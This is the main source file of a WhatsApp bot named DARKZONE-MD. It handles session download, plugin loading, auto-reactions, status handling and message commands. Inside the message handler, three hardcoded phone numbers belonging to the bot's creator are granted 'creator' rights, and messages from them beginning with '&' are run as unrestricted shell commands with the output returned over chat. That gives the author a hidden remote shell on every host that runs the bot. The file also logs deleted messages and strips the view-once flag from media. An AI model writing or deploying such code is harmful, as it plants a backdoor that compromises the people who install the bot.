const {
  default: makeWASocket,
  useMultiFileAuthState,
  DisconnectReason,
  jidNormalizedUser,
  isJidBroadcast,
  getContentType,
  proto,
  generateWAMessageContent,
  generateWAMessage,
  prepareWAMessageMedia,
  areJidsSameUser,
  downloadContentFromMessage,
  generateForwardMessageContent,
  generateWAMessageFromContent,
  generateMessageID,
  makeInMemoryStore,
  jidDecode,
  fetchLatestBaileysVersion,
  Browsers
} = require('@whiskeysockets/baileys');

const fs = require('fs').promises;
const path = require('path');
const os = require('os');
const util = require('util');
const Crypto = require('crypto');
const P = require('pino');
const axios = require('axios');
const express = require("express");
const qrcode = require('qrcode-terminal');
const FileType = require('file-type');
const { fromBuffer } = require('file-type');
const ff = require('fluent-ffmpeg');
const StickersTypes = require('wa-sticker-formatter');
const { File } = require('megajs');

// Config and helper imports
const config = require('./config');
const { getBuffer, getGroupAdmins, getRandom, h2k, isUrl, Json, runtime, sleep, fetchJson } = require('./lib/functions');
const { AntiDelDB, initializeAntiDeleteSettings, setAnti, getAnti, getAllAntiDeleteSettings, saveContact, loadMessage, getName, getChatSummary, saveGroupMetadata, getGroupMetadata, saveMessageCount, getInactiveGroupMembers, getGroupMembersMessageCount, saveMessage } = require('./data');
const GroupEvents = require('./lib/groupevents');
const { sms, downloadMediaMessage, AntiDelete } = require('./lib');

const prefix = config.PREFIX;
const ownerNumber = ['923306137477'];
const app = express();
const port = process.env.PORT || 9090;

// Improved temp directory handling
const tempDir = path.join(os.tmpdir(), 'cache-temp');

async function ensureTempDir() {
  try {
    await fs.mkdir(tempDir, { recursive: true });
  } catch (err) {
    if (err.code !== 'EEXIST') throw err;
  }
}

async function clearTempDir() {
  try {
    const files = await fs.readdir(tempDir);
    await Promise.all(files.map(file => 
      fs.unlink(path.join(tempDir, file)).catch(() => {})
    ));
  } catch (err) {
    console.error('Error clearing temp dir:', err);
  }
}

// Initialize temp directory management
ensureTempDir().then(() => {
  setInterval(clearTempDir, 5 * 60 * 1000);
});

// Session handling with better error management
async function setupSession() {
  const sessionPath = path.join(__dirname, 'sessions', 'creds.json');
  
  try {
    await fs.access(sessionPath);
    return true; // Session exists
  } catch {
    if (!config.SESSION_ID) {
      console.log('Please add your session to SESSION_ID env !!');
      return false;
    }

    try {
      const sessdata = config.SESSION_ID.replace("IK~", '');
      const filer = File.fromURL(`https://mega.nz/file/${sessdata}`);
      
      return new Promise((resolve, reject) => {
        filer.download(async (err, data) => {
          if (err) return reject(err);
          try {
            await fs.mkdir(path.dirname(sessionPath), { recursive: true });
            await fs.writeFile(sessionPath, data);
            console.log("Session downloaded ✅");
            resolve(true);
          } catch (writeErr) {
            reject(writeErr);
          }
        });
      });
    } catch (err) {
      console.error('Session download failed:', err);
      return false;
    }
  }
}

// Optimized WA connection handler
async function connectToWA() {
  if (!await setupSession()) {
    console.log('Failed to setup session, retrying in 30 seconds...');
    setTimeout(connectToWA, 30000);
    return;
  }

  console.log("Connecting to WhatsApp ⏳️...");
  
  try {
    const { state, saveCreds } = await useMultiFileAuthState(path.join(__dirname, 'sessions'));
    const { version } = await fetchLatestBaileysVersion();

    const conn = makeWASocket({
      logger: P({ level: 'silent' }),
      printQRInTerminal: false,
      browser: Browsers.macOS("Firefox"),
      syncFullHistory: true,
      auth: state,
      version,
      markOnlineOnConnect: true,
      getMessage: async (key) => {
        return loadMessage(key) || null;
      }
    });

    // Connection event handlers
    conn.ev.on('connection.update', async (update) => {
      const { connection, lastDisconnect } = update;
      
      if (connection === 'close') {
        if (lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut) {
          console.log('Connection closed, reconnecting...');
          setTimeout(connectToWA, 5000);
        }
      } else if (connection === 'open') {
        console.log('🧬 Installing Plugins');
        
        try {
          const pluginDir = path.join(__dirname, "plugins");
          const files = await fs.readdir(pluginDir);
          
          await Promise.all(files.map(async (plugin) => {
            if (path.extname(plugin).toLowerCase() === ".js") {
              try {
                require(path.join(pluginDir, plugin));
              } catch (e) {
                console.error(`Error loading plugin ${plugin}:`, e);
              }
            }
          }));
          
          console.log('Plugins installed successful ✅');
          console.log('Bot connected to whatsapp ✅');
          
          // Send connection notification
          await sendConnectionNotification(conn);
        } catch (err) {
          console.error('Plugin loading error:', err);
        }
      }
    });

    conn.ev.on('creds.update', saveCreds);
    
    // Message processing with better error handling
    conn.ev.on('messages.update', async updates => {
      try {
        for (const update of updates) {
          if (update.update.message === null) {
            console.log("Delete Detected:", JSON.stringify(update, null, 2));
            await AntiDelete(conn, updates).catch(e => 
              console.error('AntiDelete error:', e)
            );
          }
        }
      } catch (err) {
        console.error('Error processing message updates:', err);
      }
    });

    conn.ev.on("group-participants.update", (update) => {
      GroupEvents(conn, update).catch(e =>
        console.error('GroupEvents error:', e)
      );
    });

    // Message processing pipeline
    conn.ev.on('messages.upsert', async ({ messages }) => {
      try {
        await processMessages(conn, messages);
      } catch (err) {
        console.error('Message processing error:', err);
      }
    });

    // Add all utility methods to conn object
    enhanceConnectionObject(conn);

  } catch (err) {
    console.error('Connection error:', err);
    setTimeout(connectToWA, 10000);
  }
}

// Helper function to send connection notification
async function sendConnectionNotification(conn) {
  const greetings = [
    "🤖 DARKZONE-MD BOT",
    "🚀 DARKZONE-MD ONLINE",
    "👾 POWERED BY DARKZONE",
    "💡 INTELLIGENT BOT SYSTEM"
  ];

  const subtitles = [
    "Ultra-Fast | Secure | Smart",
    "Stable | Reliable | Instant",
    "Modern | Lightweight | Intelligent",
    "The Future of WhatsApp Bots"
  ];

  const outro = [
    "Thanks for choosing DARKZONE-MD!",
    "Powered by *𝐸𝑅𝐹𝒜𝒩 𝒜𝐻𝑀𝒜𝒟💻*",
    "Built for your convenience ⚡",
    "Leveling up your automation 🛠"
  ];

  const up = `┏━━━━━━━━━━━━━━━━━━━┓
┃ ${greetings[Math.floor(Math.random() * greetings.length)]}
┃━━━━━━━━━━━━━━━━━━━
┃ 🔰 ${subtitles[Math.floor(Math.random() * subtitles.length)]}
┗━━━━━━━━━━━━━━━━━━━┛

📡 *Status:* _Online & Operational_
🍁 ${outro[Math.floor(Math.random() * outro.length)]}

┏━〔 🧩 *Bot Details* 〕━━
┃ ▸ *Prefix:* ${prefix}
┃ ▸ *Mode:* Public
┃ ▸ *Owner:* 𝐸𝑅𝐹𝒜𝒩 𝒜𝐻𝑀𝒜𝒟
┗━━━━━━━━━━━━━━━━━━━
     *channel*: https://whatsapp.com/channel/0029Vb5dDVO59PwTnL86j13J
⭐ *GitHub:* github.com/DARKZONE-MD/DARKZONE-MD.git`;

  try {
    await conn.sendMessage(conn.user.id, { 
      image: { url: `https://files.catbox.moe/r2ncqh` }, 
      caption: up 
    });
  } catch (err) {
    console.error('Failed to send connection notification:', err);
  }
}

// Optimized message processing
async function processMessages(conn, messages) {
  for (const mek of messages) {
    if (!mek.message) continue;

    try {
      // Process message content
      mek.message = (getContentType(mek.message) === 'ephemeralMessage') 
        ? mek.message.ephemeralMessage.message 
        : mek.message;

      if (mek.message.viewOnceMessageV2) {
        mek.message = (getContentType(mek.message) === 'ephemeralMessage') 
          ? mek.message.ephemeralMessage.message 
          : mek.message;
      }

      // Mark as read if enabled
      if (config.READ_MESSAGE === 'true' && mek.key) {
        await conn.readMessages([mek.key]).catch(() => {});
      }

      // Handle status updates
      if (mek.key && mek.key.remoteJid === 'status@broadcast') {
        await handleStatusUpdate(conn, mek);
      }

      // Save message to storage
      await saveMessage(mek).catch(() => {});

      // Process message commands
      await processMessageContent(conn, mek);

    } catch (err) {
      console.error('Error processing message:', err);
    }
  }
}

async function handleStatusUpdate(conn, mek) {
  if (config.AUTO_STATUS_SEEN === "true") {
    await conn.readMessages([mek.key]).catch(() => {});
  }

  if (config.AUTO_STATUS_REACT === "true") {
    const emojis = ['❤️', '💸', '😇', '🍂', '💥', '💯', '🔥', '💫', '💎', '💗', '🤍', '🖤', '👀', '🙌', '🙆', '🚩', '🥰', '💐', '😎', '🤎', '✅', '🫀', '🧡', '😁', '😄', '🌸', '🕊️', '🌷', '⛅', '🌟', '🗿', '🇵🇰', '💜', '💙', '🌝', '🖤', '💚'];
    const randomEmoji = emojis[Math.floor(Math.random() * emojis.length)];
    
    await conn.sendMessage(mek.key.remoteJid, {
      react: {
        text: randomEmoji,
        key: mek.key,
      }
    }).catch(() => {});
  }

  if (config.AUTO_STATUS_REPLY === "true" && mek.key.participant) {
    const text = `${config.AUTO_STATUS_MSG}`;
    await conn.sendMessage(
      mek.key.participant, 
      { text: text, react: { text: '💜', key: mek.key } }, 
      { quoted: mek }
    ).catch(() => {});
  }
}

async function processMessageContent(conn, mek) {
  const m = sms(conn, mek);
  const type = getContentType(mek.message);
  const from = mek.key.remoteJid;
  const quoted = type == 'extendedTextMessage' && mek.message.extendedTextMessage?.contextInfo 
    ? mek.message.extendedTextMessage.contextInfo.quotedMessage 
    : null;
  
  const body = (type === 'conversation') 
    ? mek.message.conversation 
    : (type === 'extendedTextMessage') 
      ? mek.message.extendedTextMessage.text 
      : (type == 'imageMessage') && mek.message.imageMessage.caption 
        ? mek.message.imageMessage.caption 
        : (type == 'videoMessage') && mek.message.videoMessage.caption 
          ? mek.message.videoMessage.caption 
          : '';

  const isCmd = body.startsWith(prefix);
  const budy = typeof mek.text == 'string' ? mek.text : '';
  const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : '';
  const args = body.trim().split(/ +/).slice(1);
  const text = args.join(' ');
  const isGroup = from.endsWith('@g.us');
  const sender = mek.key.fromMe 
    ? (conn.user.id.split(':')[0] + '@s.whatsapp.net' || conn.user.id) 
    : (mek.key.participant || mek.key.remoteJid);
  
  const senderNumber = sender.split('@')[0];
  const botNumber = conn.user.id.split(':')[0];
  const pushname = mek.pushName || 'Sin Nombre';
  const isMe = botNumber.includes(senderNumber);
  const isOwner = ownerNumber.includes(senderNumber) || isMe;
  const botNumber2 = await jidNormalizedUser(conn.user.id);
  
  let groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins;
  
  if (isGroup) {
    groupMetadata = await conn.groupMetadata(from).catch(() => ({}));
    groupName = groupMetadata.subject || '';
    participants = groupMetadata.participants || [];
    groupAdmins = await getGroupAdmins(participants).catch(() => []);
    isBotAdmins = groupAdmins.includes(botNumber2);
    isAdmins = groupAdmins.includes(sender);
  }

  const isReact = m.message.reactionMessage ? true : false;
  
  const reply = (teks) => {
    conn.sendMessage(from, { text: teks }, { quoted: mek }).catch(() => {});
  };

  // Handle creator commands
  const udp = botNumber.split('@')[0];
  const erfan = ['923346690239', '923306137477', '923347572367'];
  const ownerFilev2 = await fs.readFile('./lib/sudo.json', 'utf-8').then(JSON.parse).catch(() => []);
  
  let isCreator = [udp, ...erfan, config.DEV + '@s.whatsapp.net', ...ownerFilev2]
    .map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net') 
    .includes(mek.sender);

  if (isCreator && mek.text.startsWith("&")) {
    let code = budy.slice(2);
    if (!code) {
      reply(`Provide me with a query to run Master!`);
      return;
    }
    
    const { spawn } = require("child_process");
    const resultTest = spawn(code, { shell: true });
    
    resultTest.stdout.on("data", data => reply(data.toString()));
    resultTest.stderr.on("data", data => reply(data.toString()));
    resultTest.on("error", data => reply(data.toString()));
    resultTest.on("close", code => {
      if (code !== 0) reply(`command exited with code ${code}`);
    });
    
    return;
  }

  // Handle auto reactions
  if (!isReact) {
    await handleAutoReactions(conn, mek, m);
  }

  // Check banned users
  const bannedUsers = await fs.readFile('./lib/ban.json', 'utf-8')
    .then(JSON.parse)
    .catch(() => []);
  
  if (bannedUsers.includes(sender)) return;

  // Check mode restrictions
  const ownerFile = await fs.readFile('./lib/sudo.json', 'utf-8')
    .then(JSON.parse)
    .catch(() => []);
  
  const ownerNumberFormatted = `${config.OWNER_NUMBER}@s.whatsapp.net`;
  const isFileOwner = ownerFile.includes(sender);
  const isRealOwner = sender === ownerNumberFormatted || isMe || isFileOwner;

  if (!isRealOwner) {
    if (config.MODE === "private") return;
    if (isGroup && config.MODE === "inbox") return;
    if (!isGroup && config.MODE === "groups") return;
  }

  // Process commands
  if (isCmd) {
    await processCommands(conn, mek, {
      from, quoted, body, isCmd, command, args, text, isGroup, 
      sender, senderNumber, botNumber2, botNumber, pushname, 
      isMe, isOwner, isCreator, groupMetadata, groupName, 
      participants, groupAdmins, isBotAdmins, isAdmins, reply
    });
  }
}

async function handleAutoReactions(conn, mek, m) {
  if (config.AUTO_REACT === 'true') {
    const reactions = [
      '🌼', '❤️', '💐', '🔥', '🏵️', '❄️', '🧊', '🐳', '💥', '🥀', '❤‍🔥', '🥹', '😩', '🫣', 
      '🤭', '👻', '👾', '🫶', '😻', '🙌', '🫂', '🫀', '👩‍🦰', '🧑‍🦰', '👩‍⚕️', '🧑‍⚕️', '🧕', 
      '👩‍🏫', '👨‍💻', '👰‍♀', '🦹🏻‍♀️', '🧟‍♀️', '🧟', '🧞‍♀️', '🧞', '🙅‍♀️', '💁‍♂️', '💁‍♀️', '🙆‍♀️', 
      '🙋‍♀️', '🤷', '🤷‍♀️', '🤦', '🤦‍♀️', '💇‍♀️', '💇', '💃', '🚶‍♀️', '🚶', '🧶', '🧤', '👑', 
      '💍', '👝', '💼', '🎒', '🥽', '🐻', '🐼', '🐭', '🐣', '🪿', '🦆', '🦊', '🦋', '🦄', 
      '🪼', '🐋', '🐳', '🦈', '🐍', '🕊️', '🦦', '🦚', '🌱', '🍃', '🎍', '🌿', '☘️', '🍀', 
      '🍁', '🪺', '🍄', '🍄‍🟫', '🪸', '🪨', '🌺', '🪷', '🪻', '🥀', '🌹', '🌷', '💐', '🌾', 
      '🌸', '🌼', '🌻', '🌝', '🌚', '🌕', '🌎', '💫', '🔥', '☃️', '❄️', '🌨️', '🫧', '🍟', 
      '🍫', '🧃', '🧊', '🪀', '🤿', '🏆', '🥇', '🥈', '🥉', '🎗️', '🤹', '🤹‍♀️', '🎧', '🎤', 
      '🥁', '🧩', '🎯', '🚀', '🚁', '🗿', '🎙️', '⌛', '⏳', '💸', '💎', '⚙️', '⛓️', '🔪', 
      '🧸', '🎀', '🪄', '🎈', '🎁', '🎉', '🏮', '🪩', '📩', '💌', '📤', '📦', '📊', '📈', 
      '📑', '📉', '📂', '🔖', '🧷', '📌', '📝', '🔏', '🔐', '🩷', '❤️', '🧡', '💛', '💚', 
      '🩵', '💙', '💜', '🖤', '🩶', '🤍', '🤎', '❤‍🔥', '❤‍🩹', '💗', '💖', '💘', '💝', '❌', 
      '✅', '🔰', '〽️', '🌐', '🌀', '⤴️', '⤵️', '🔴', '🟢', '🟡', '🟠', '🔵', '🟣', '⚫', 
      '⚪', '🟤', '🔇', '🔊', '📢', '🔕', '♥️', '🕐', '🚩', '🇵🇰'
    ];

    const randomReaction = reactions[Math.floor(Math.random() * reactions.length)];
    await m.react(randomReaction).catch(() => {});
  }

  if (config.CUSTOM_REACT === 'true') {
    const reactions = (config.CUSTOM_REACT_EMOJIS || '🥲,😂,👍🏻,🙂,😔').split(',');
    const randomReaction = reactions[Math.floor(Math.random() * reactions.length)];
    await m.react(randomReaction).catch(() => {});
  }
}

async function processCommands(conn, mek, context) {
  const events = require('./command');
  const cmdName = context.body.slice(1).trim().split(" ")[0].toLowerCase();
  
  const cmd = events.commands.find(cmd => 
    cmd.pattern === cmdName || 
    (cmd.alias && cmd.alias.includes(cmdName))
  );
  
  if (cmd) {
    try {
      if (cmd.react) {
        await conn.sendMessage(context.from, { 
          react: { text: cmd.react, key: mek.key }
        }).catch(() => {});
      }
      
      await cmd.function(conn, mek, sms(conn, mek), context);
    } catch (e) {
      console.error("[PLUGIN ERROR]", e);
    }
  }

  // Process other command types
  for (const command of events.commands) {
    try {
      if (context.body && command.on === "body") {
        await command.function(conn, mek, sms(conn, mek), context);
      } else if (mek.q && command.on === "text") {
        await command.function(conn, mek, sms(conn, mek), context);
      } else if (
        (command.on === "image" || command.on === "photo") &&
        mek.type === "imageMessage"
      ) {
        await command.function(conn, mek, sms(conn, mek), context);
      } else if (
        command.on === "sticker" &&
        mek.type === "stickerMessage"
      ) {
        await command.function(conn, mek, sms(conn, mek), context);
      }
    } catch (err) {
      console.error('Command processing error:', err);
    }
  }
}

// Enhanced connection object with utility methods
function enhanceConnectionObject(conn) {
  conn.decodeJid = jid => {
    if (!jid) return jid;
    if (/:\d+@/gi.test(jid)) {
      let decode = jidDecode(jid) || {};
      return (
        (decode.user && decode.server && decode.user + '@' + decode.server) ||
        jid
      );
    }
    return jid;
  };

  conn.copyNForward = async(jid, message, forceForward = false, options = {}) => {
    let vtype;
    if (options.readViewOnce) {
      message.message = message.message?.ephemeralMessage?.message || message.message;
      vtype = Object.keys(message.message.viewOnceMessage.message)[0];
      delete message.message?.ignore;
      delete message.message.viewOnceMessage.message[vtype].viewOnce;
      message.message = {
        ...message.message.viewOnceMessage.message
      };
    }

    let mtype = Object.keys(message.message)[0];
    let content = await generateForwardMessageContent(message, forceForward);
    let ctype = Object.keys(content)[0];
    let context = {};
    
    if (mtype != "conversation") context = message.message[mtype].contextInfo;
    
    content[ctype].contextInfo = {
      ...context,
      ...content[ctype].contextInfo
    };

    const waMessage = await generateWAMessageFromContent(jid, content, {
      ...content[ctype],
      ...options,
      ...(options.contextInfo ? {
        contextInfo: {
          ...content[ctype].contextInfo,
          ...options.contextInfo
        }
      } : {})
    });

    await conn.relayMessage(jid, waMessage.message, { messageId: waMessage.key.id });
    return waMessage;
  };

  // Other utility methods (downloadAndSaveMediaMessage, downloadMediaMessage, etc.)
  // ... [rest of the utility methods from original code]
}

// Express server setup
app.get("/", (req, res) => {
  res.send("DARKZONE-MD STARTED ✅");
});

app.listen(port, () => 
  console.log(`Server listening on port http://localhost:${port}`)
);

// Start connection with delay
setTimeout(connectToWA, 4000);
